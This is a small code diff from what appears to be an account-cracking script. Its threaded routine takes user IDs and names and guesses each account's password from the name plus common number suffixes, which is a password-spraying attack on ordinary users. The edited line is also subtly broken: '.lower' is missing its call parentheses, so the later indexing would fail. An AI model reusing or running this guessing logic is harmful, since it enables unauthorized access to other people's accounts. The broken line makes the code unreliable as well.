@@ -235,7 +235,7 @@ def _____LANGSUNG_____():
 	with ThreadPoolExecutor(max_workers=30) as dicky:
 		for user in id:
 			uid, name = user.split("|")
-			nam = name.split(' ')
+			nam = name.split(' ')[0].lower
 			if len(name) == 3 or len(name) == 4 or len(name) == 5:
 				pwx = [name, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345", nam[0]+"786", nam[0]+"1122", "112233", "223344", "334455", "445566", "556677", "778899", "102030", "1234567"]
 			else:
